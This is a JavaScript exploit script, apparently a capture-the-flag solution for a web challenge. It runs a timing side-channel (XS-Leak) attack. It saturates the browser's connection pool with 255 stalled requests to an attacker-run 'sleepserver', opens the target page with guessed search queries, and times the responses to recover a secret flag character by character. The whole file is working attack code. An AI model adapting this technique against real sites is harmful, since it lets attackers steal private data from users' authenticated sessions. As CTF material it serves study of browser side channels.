// sleepserver is hosted sleepserver from solve/
// url is the url of the page (should be like something.lac.tf)
const sleepserver = (port, end) => `https://<REDACTED_SLEEPSERVER>:${port}${end}`;
const url = 'https://<CHALLENGE>/';

const w = window.open('/timer.html', '', 'height=570,width=520');

const block = async () => {
  var revive = () => fetch(sleepserver(5001, '/revive?x=1'));
  await revive();
  var promises = [];
  window.controller = new AbortController();
  for (let i = 0; i < 255; ++i) {
    promises.push(fetch(
      sleepserver(5100 + i, '/sleep?x=1'),
      { mode: 'no-cors', signal: controller.signal }
    ).catch(r => 'owo'));
  }
  await Promise.all(promises);
  console.log('blocking finished');
};

const waitForBlock = async () => {
  while (1) {
    const resp = await fetch(sleepserver(5400, '/info')).then(r => r.json());
    if (resp.n >= 255) break;
    await new Promise(res => setTimeout(res, 500));
  }
};

const unblock = () => fetch(sleepserver(5001, '/kill?x=1'));

const test = async (query) => {
  // const x = window.open(url, '', 'height=570,width=520');
  const x = window.open(url, '', 'height=57,width=52');
  await new Promise(res => setTimeout(res, 500));
  x.location.replace(`${url}#/search?q=${encodeURIComponent(query)}`);
  setTimeout(() => {
    w.postMessage('rawr');
  }, 100)
  setTimeout(() => x.close(), 1500);
};

const forceBlock = async () => {
  while (!isBlocked) {
    await unblock();
    block().then(() => (isBlocked = false));
    await waitForBlock();
    isBlocked = true;
  }
};


const times = [];
window.addEventListener('message', (e) => {
  const msg = JSON.parse(e.data);
  // console.log(msg.delta);
  times.push(msg.delta);
});

let isBlocked = false;
let exfil = 'lac';
let maxch = '';
let maxchtime = 0;
let minchtime = 10000;
let stop = false;
const alpha = 'abcdefghijklmnopqrstuvwxyz01234567890_{}';
// const n = 10;
const n = 3;
const wait = 300;

window.stoppp = () => (stop = true);

(async () => {
  while (!exfil.includes(alpha[alpha.length - 1])) {
    await unblock();
    while (!isBlocked) {
      await forceBlock();
    }

    let alphai = 0;
    while (alphai < alpha.length) {
      const ch = alpha[alphai];
      times.splice(0, times.length);
      document.querySelector('.candidate').textContent = exfil + ch;

      for (let i = 0; i < n; ++i) {
        if (stop) {
          w.close();
          return;
        }
        await test(exfil + ch);
        await new Promise(res => setTimeout(res, wait));
        if (!isBlocked) break;
      }
      if (!isBlocked) {
        await forceBlock();
        continue;
      }

      await new Promise(res => setTimeout(res, wait));
      const avg = times.reduce((l, r) => l + r, 0) / times.length;
      const min = Math.min(...times); console.log({ ch, avg, min });
      if (isNaN(avg) || times.length != n) {
        continue;
      }
      minchtime = Math.min(minchtime, min);
      if (min > maxchtime) {
        maxch = ch;
        maxchtime = min;
        // early stop
        if (maxchtime / minchtime > 4.5) break;
      }
      times.splice(0, times.length);
      alphai++;
    }
    exfil += maxch;
    maxch = '';
    maxchtime = 0;
    console.log({ exfil });
    document.querySelector('.exfil').textContent = exfil;
  }

  // await new Promise(res => setTimeout(res, 10000));
  w.close();
})();

